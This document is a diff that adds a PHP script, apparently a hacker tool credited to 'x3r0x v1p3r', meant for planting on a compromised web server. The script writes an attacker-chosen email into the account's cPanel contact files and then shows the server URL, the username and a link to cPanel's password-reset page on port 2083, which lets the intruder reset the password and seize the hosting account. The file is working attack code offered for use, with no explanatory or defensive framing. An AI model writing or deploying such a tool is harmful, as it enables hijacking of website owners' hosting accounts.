@@ -1,1 +1,102 @@
-test
+<?php
+##MOD BY x3r0x v1p3r ##
+echo '<html>
+    <head> 
+	      <title>Script Resetpass CP  </title>
+	      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		  <style>
+		      body {
+	          color:#80D713;
+	          background-color:#000000;
+	          }
+			  h2{
+			  color:#80D713;
+			  }
+			  input[type="email"] {
+    border-radius: 25px;
+    border-bottom-color:  blue;
+    border-top-color:  blue;
+    padding: 10;
+}
+		  </style>
+      	</head>
+     <body>
+	 <!--SCC -->
+       <center> 	 
+	   
+    <p><h1 style="font: 20pt cursive;">Script Resetpass CP</h1></p>
+	 <p><h2 style="font: 20pt cursive;">Mod By x3r0x v1p3r</h2></p>
+	<p>   
+	    <form action="#" method="post">
+	<input type="email" name="email" placeholder="Email" style="background-color: transparent;font: 15pt cursive;color:#80D713;" />
+	<input type="submit" name="submit" value="Save" style="background-color: transparent;font: 15pt cursive;color:#80D713;"/>
+	</form>
+	
+	<br /><br /><br />
+	</p>
+	</div>
+   </center>
+    </body>
+</html>';
+
+$user = get_current_user();
+$site = $_SERVER['HTTP_HOST'];
+$ips = getenv('REMOTE_ADDR');
+
+if(isset($_POST['submit'])){
+	
+	$email = $_POST['email'];
+	$wr = 'email:'.$email;
+$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
+fwrite($f, $wr); 
+fclose($f);
+$f = fopen('/home/'.$user.'/.contactinfo', 'w');
+fwrite($f, $wr); 
+fclose($f);
+$http = "https://";
+$copy_port = "2083";
+$parm = $site.':2083/resetpass?start=1';
+echo "<center>Copy This </center>";
+
+
+
+
+echo'<center><input type="text" value="'.$http.''.$site.':'.$copy_port.'|'.$user.'|" id="cp">
+
+<button onclick="cpfull()">Copy text</button></center>
+ <script>function cpfull() {
+ 
+  var copyText = document.getElementById("cp");
+
+  copyText.select();
+
+  document.execCommand("copy");
+
+}
+</script>
+';
+
+
+
+
+
+echo'<center><input type="text" value="'.$user.'" id="user">
+
+<button onclick="username()">Copy text</button></center>
+ <script>function username() {
+ 
+  var copyText = document.getElementById("user");
+
+  copyText.select();
+
+  document.execCommand("copy");
+
+}
+</script>
+';
+
+echo '<br/><center><a target="_blank" href="'.$http.''.$parm.'">RESET</a></center>';
+
+}
+
+?>
